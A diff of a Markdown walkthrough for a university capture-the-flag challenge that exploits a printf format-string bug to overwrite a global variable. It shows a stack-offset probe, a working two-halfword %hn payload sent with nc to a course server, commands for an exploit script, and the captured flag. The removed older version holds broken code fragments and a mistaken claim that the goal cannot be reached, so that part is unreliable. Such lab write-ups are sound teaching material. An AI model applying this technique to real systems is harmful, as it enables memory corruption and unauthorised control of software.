@@ -1,189 +1,266 @@
-# formatstring3 Walkthrough (Format String Exploit)
+# formatstring3 Walkthrough
 
 ## Challenge Overview
 
-**Binary**: `login`  
-**Vulnerability**: User input is used directly in `printf()` as a format string  
-**Goal**: Overwrite the global variable `utk_password` to unlock the flag  
-**Constraint**: Only 128 bytes of input allowed
+- Binary: `login`
+- Bug: User input is passed directly to `printf(input)`
+- Goal: Set global `utk_password` to `0xD0C0FFEE`
+- Remote target: `moa6.eecs.utk.edu:32130`
 
-### TL;DR: What You're Doing
-1. **Leak**: Use format strings to read values from the stack
-2. **Write**: Use format strings to write a value to a specific memory address
-3. **Win**: Change the password variable to unlock the flag
+The key format-string primitive is `%hn`:
+- `%n` writes the number of characters printed so far
+- `h` makes it a 16-bit write
+- So `%hn` writes a 2-byte value to an address pointer from the stack
 
-## Part 1: How The Vulnerability Works
+---
 
-### The Source Code
-```c
-int utk_password = 0x12341234;  // Global variable we need to change
+## Method 1 (Do It Manually, No Python Script)
 
-int myutk_login(char *kim_password) {
-	printf(kim_password);  // ❌ BUG: treats user input as format string!
-	printf("%x %p\n", utk_password, &utk_password);  // Prints the current value and address
-	if (utk_password == 0xD0C0FFEE) {
-        system("cat flag.txt");  // ✅ Flag appears if we change the value
-	}
-}
-```
+This is the method to learn first.
 
-### Why This Is a Security Problem
-- `printf()` normally expects TWO things: a format string AND values to print
-- This code only receives user input (no separate format args)
-- So the program treats the user input ITSELF as the format string
-- Format string codes like `%x` and `%hn` let us leak/write memory
-
-### What We Can Do
-- **`%x`** - Read a value from the stack   
-- **`%5$hn`** - Write a 2-byte value to a memory address (we'll explain the "5$" part next)
-
-## Part 2: Understanding `%5$hn` (The Magic Format String)
-
-### What Each Part Means
-- **`%`** - Start of a format code
-- **`5$`** - Look at the 5th argument on the stack (not the 1st, 2nd, etc.)
-- **`hn`** - Write 2 bytes (16 bits) to the address pointed to by that argument
-
-### How We Use It
-Here's the key insight: When we send a payload like this:
-```
-[4-byte address][padding][%5$hn]
-```
-
-The program:
-1. Puts our input on the stack
-2. The first 4 bytes (the address) becomes the 1st argument
-3. `%5$hn` reaches the 5th argument position and writes to that address
-4. **How much does it write?** Whatever the byte count of our payload is!
-
-**Example**: If payload is 119 bytes total, it writes the value `119` (0x77) to the target address.
-
-### Finding Position 5
-You can use GDB to verify this, but the script already knows position 5 works.
-
-## Part 3: The 128-Byte Limitation Challenge
-
-### The Problem
-Your input is limited to **128 bytes** total. Let's see what that means:
-
-- **4 bytes** = The target address
-- **5 bytes** = The format string `%5$hn`
-- **1 byte** = The newline at the end
-- **Remaining** = 128 - 4 - 5 - 1 = **118 bytes** can be padding
-
-Since the amount written is equal to payload size, you can only write values up to ~118-127.
-
-### Why This Matters
-The target value is `0xD0C0FFEE` (about 3.5 billion!) — way too large to fit in 128 bytes. So we **can't solve this directly**. The challenge is a **proof of concept** — it demonstrates the technique works, even if we can't reach the final goal.
-
-### What We Can Actually Do
-Write a small value to prove the memory write works (the script uses value `119`)
-
-## Part 4: The Python Exploit Script Explained
-
-### Step 1: `leak_stack_value()` - Read Memory
-```python
-payload = b"LEAK%5$x\n"
-```
-This uses `%5$x` to **read** the 5th stack argument and print it in hex. It doesn't write anything — just shows what's there.
-
-### Step 2: `write_value_to_memory()` - Write Memory
-```python
-payload = addr + (b'X' * pad_size) + b"%5$hn\n"
-```
-This creates a payload that:
-1. Puts the target address first (4 bytes)
-2. Pads with junk bytes to reach the desired payload size
-3. Ends with `%5$hn` to trigger the write
-4. The write value = total payload size in bytes
-
-**Example for value 119:**
-- Address: 4 bytes (0x80e6048)
-- Padding: 110 bytes of 'X'
-- Format string: 5 bytes (%5$hn)
-- Newline: 1 byte
-- **Total: 120 bytes** → Writes 120 to memory
-
-### How to Run It
-```bash
-cd /home/jbenjam7/cs466/ctf/formatstring3
-
-# Just leak a value
-python3 exploit_fs3.py leak
-
-# Write a specific value (e.g., 100)
-python3 exploit_fs3.py write 100
-
-# Run both leak and write
-python3 exploit_fs3.py test
-        print(f"Output: {line}")
-        # Shows: 12340077 (wrote 0x0077 = 119 to low word)
-PYEOF
-```
-
-### Verification Output
-
-```
-What's Dr. Kim's password for MyUTK?
-JXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX XXXXX12340077 0x80e6048
-Wrong Dr. Kim's password. You are't allowed to log in to his MyUTK
-```
-
-Value changed from `0x12341234` to `0x12340077` ✓ Write confirmed working!
-
-## Part 5: Remote Testing
-
-### Target Information
-
-- **Host**: moa6.eecs.utk.edu
-- **Port**: 32130
-- Same binary, same vulnerability
-
-### Quick Test
-
-```bash
-python3 << 'PYEOF'
-import struct, socket
-
-TARGET_ADDR = 0x80e6048
-addr = struct.pack('<I', TARGET_ADDR)
-```
-
-## Summary: Understanding the Challenge
-
-### What the Script Does
-
-**`exploit_fs3.py`** has two main functions:
-
-1. **`leak_stack_value()`** - Reads memory using `%5$x`
-   - Just shows Stack values to prove we can read memory
-   - Doesn't change anything
-
-2. **`write_value_to_memory(value)`** - Writes memory using `%5$hn`
-   - Puts target address first
-   - Pads to desired payload size
-   - Triggers the write with `%5$hn`
-   - The value written = payload size in bytes
-
-### The Core Exploit Steps
-
-1. **Identify the target**: The program tells you the address (`0x80e6048`)
-2. **Calculate payload size**: What value do you want to write?
-3. **Build the payload**: `[address][padding][format_string]`
-4. **Send it**: Program writes the payload size to the target address
-5. **Check result**: The memory changes!
-
-### Why We Can't Reach the Final Goal
-
-- We can only write values 1-127 (limited by 128-byte buffer)
-- The target value is 0xD0C0FFEE (about 3.5 billion)
-- This is a **proof of concept** — we demonstrate the technique works with small values
-
-### Quick Test
+### 1. Confirm target address and baseline output
 
 ```bash
 cd /home/jbenjam7/cs466/ctf/formatstring3
-python3 exploit_fs3.py write 119
+./login <<< 'TEST'
 ```
 
-You should see the password value change from `0x12341234` towards `0x12340077` (119 in hex = 0x77).
+You should see something like:
+- `12341234 0x80e6048`
+
+So target address is `0x080e6048`.
+
+### 2. Find where your input appears on the stack
+
+```bash
+./login <<< 'AAAABBBB.%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p'
+```
+
+You should see:
+- `%5$p = 0x41414141` (`AAAA`)
+- `%6$p = 0x42424242` (`BBBB`)
+
+That means:
+- 5th argument points to first 4 bytes of your payload
+- 6th argument points to second 4 bytes of your payload
+
+### 3. Split desired value into two halfwords
+
+Target value:
+- `0xD0C0FFEE`
+
+Split into 16-bit parts:
+- high halfword: `0xD0C0` = `53440`
+- low halfword: `0xFFEE` = `65518`
+
+### 4. Decide write order and addresses
+
+Because printed character count only increases, write smaller first.
+
+Here values are:
+- `0xD0C0` (53440) first
+- `0xFFEE` (65518) second
+
+Address mapping for a 32-bit value at `0x080e6048`:
+- low halfword at `0x080e6048`
+- high halfword at `0x080e604a`
+
+So payload pointers should be:
+1. `0x080e604a` (high halfword location) -> stack arg 5
+2. `0x080e6048` (low halfword location) -> stack arg 6
+
+Little-endian bytes:
+- `0x080e604a` -> `\x4a\x60\x0e\x08`
+- `0x080e6048` -> `\x48\x60\x0e\x08`
+
+### 5. Compute padding values
+
+Printed count starts at 8 because of the two 4-byte raw addresses.
+
+First write target:
+- need count = `53440`
+- already printed = `8`
+- pad1 = `53440 - 8 = 53432`
+
+Second write target:
+- currently printed = `53440`
+- need count = `65518`
+- pad2 = `65518 - 53440 = 12078`
+
+So format segment is:
+- `%53432c%5$hn%12078c%6$hn`
+
+### 6. Final payload and send
+
+Use `printf` so escape bytes are interpreted and format string is sent literally.
+Use `%%` in shell `printf` so target receives `%`.
+
+```bash
+printf '\x4a\x60\x0e\x08\x48\x60\x0e\x08%%53432c%%5$hn%%12078c%%6$hn\n' | nc moa6.eecs.utk.edu 32130
+```
+
+Expected success indicators:
+- `d0c0ffee 0x80e6048`
+- flag line prints after that
+
+### 7. Quick formula for similar challenges
+
+If writing two halfwords with `%hn`:
+
+1. Put two target pointers first
+2. Let `base = bytes_in_pointer_prefix`
+3. `pad1 = first_value - base`
+4. `pad2 = second_value - first_value`
+5. Payload: `[ptr1][ptr2]%pad1c%X$hn%pad2c%Y$hn`
+
+If `second_value < first_value`, use wrap-around:
+- `pad2 = (second_value + 0x10000) - first_value`
+
+---
+
+## Method 2 (Python Script Workflow)
+
+Use this for repeatability after you understand Method 1. The script automates:
+- Stack offset discovery
+- Halfword splitting
+- Padding calculation
+- Payload building
+
+Script file:
+- `exploit_fs3.py`
+
+### Commands available
+
+| Command | What it does | Example |
+|---------|------------|---------|
+| `find-offset` | Auto-detect where your input lands on stack | `python3 exploit_fs3.py find-offset` |
+| `exploit` | Find offset + build + send full 32-bit write | `python3 exploit_fs3.py exploit --remote` |
+| `leak` | Simple proof-of-concept stack read | `python3 exploit_fs3.py leak` |
+| `write VALUE` | Simple 16-bit write (for learning) | `python3 exploit_fs3.py write 119` |
+
+### Step-by-step terminal workflow
+
+```bash
+cd /home/jbenjam7/cs466/ctf/formatstring3
+
+# Step 1: Find where your input lands on the stack
+python3 exploit_fs3.py find-offset
+# Output: [+] Input starts at stack argument %5$...
+
+# Step 2: Exploit with auto-detected offset
+python3 exploit_fs3.py exploit --remote
+# Output:
+#   [*] Using base offset: %5$
+#   [*] Target address: 0x080e6048
+#   [*] Target value:   0xd0c0ffee
+#   [*] Payload length: 33 bytes
+#   d0c0ffee 0x80e6048
+#   cosc466-flag-{WaYgSpU5rSEUbXW6CPVF}
+```
+
+### Retargeting (custom address/value)
+
+```bash
+# Use explicit target address and value
+python3 exploit_fs3.py exploit 0x12345678 0xAABBCCDD --remote
+
+# Local testing (no --remote flag)
+python3 exploit_fs3.py exploit 0x80e6048 0xD0C0FFEE
+```
+
+### How the Python script differs from manual method
+
+**Manual method (Method 1):**
+- You discover offset by hand: `AAAABBBB.%1$p...%8$p`
+- You manually split: high = 0xD0C0, low = 0xFFEE
+- You manually convert to little-endian bytes
+- You manually calculate paddings: 53432 and 12078
+- You craft one raw `printf | nc` command
+- Good for learning; prone to arithmetic errors
+
+**Python method:**
+- Script sends probe and parses output to find offset automatically
+- Script splits halfwords and calculates paddings for you
+- Script handles endianness conversion
+- Script builds payload with correct format indices (%5, %6, etc.)
+- Single command does all of it
+- Good for repeated/automated exploitation
+
+### Key advantage: Adaptive to offset changes
+
+If the stack layout changes and offset moves from %5 to something else:
+
+**Manual method:**
+- You'd have to redo all your math and edit the printf command
+
+**Python method:**
+- Just run: `python3 exploit_fs3.py find-offset`
+- Then: `python3 exploit_fs3.py exploit --remote`
+- Script auto-detects new offset and adapts payload
+
+### Why this helps
+
+- No manual calculations or endian handling needed
+- Faster for retargeting different address/value pairs
+- Robust to stack offset changes
+- Better for production/repeated exploits
+- Still performs the same two-halfword write technique underneath
+
+---
+
+## Common Pitfalls
+
+1. Missing `printf` in shell pipeline
+- Wrong: `'\x4a...\n' | nc ...`
+- Right: `printf '\x4a...\n' | nc ...`
+
+2. Forgetting double percent in shell `printf`
+- In shell command string, use `%%53432c%%5$hn...`
+- Target process receives `%53432c%5$hn...`
+
+3. Wrong endianness
+- x86 is little-endian, so address bytes look reversed
+
+4. Wrong write order
+- Write smaller halfword count first unless using explicit wrap math
+
+5. Treating 128-byte input as a blocker
+- Width specifiers (`%53432c`) generate large output count without needing giant input
+
+---
+
+## Learning Path & Recommended Workflow
+
+### For first-time learning:
+1. Read **Method 1** completely
+2. Run steps 1-6 manually in terminal
+3. Verify you get the flag with `printf | nc`
+4. Then read **Method 2** to see how it automates everything
+
+### For repeated exploitation:
+1. Use `python3 exploit_fs3.py find-offset` to verify current stack layout
+2. Use `python3 exploit_fs3.py exploit --remote` to exploit
+3. Done
+
+### The core technique you learned:
+- Format strings control printed character count
+- `%hn` writes that count (16-bit) to a memory address
+- Split a 32-bit target into two 16-bit halfwords
+- Use padding (`%Nc`) to reach exact character counts
+- Two writes = one complete 32-bit value
+
+This technique applies to many other format-string challenges beyond this one.
+
+---
+
+## Summary
+
+**Challenge:** Overwrite a 32-bit global variable via format-string exploit using two `%hn` writes.
+
+**Key insight:** `%hn` writes the number of printed characters so far. Use padding to control exact values and split 32-bit targets into two halfword writes.
+
+**Two ways to solve:**
+1. **Manual:** Calculate and build payload by hand. Best for learning.
+2. **Python:** Script auto-detects offset and builds payload. Best for speed and reuse.
+
+**Both produce the same result:** `0xD0C0FFEE` in memory, flag unlocked.
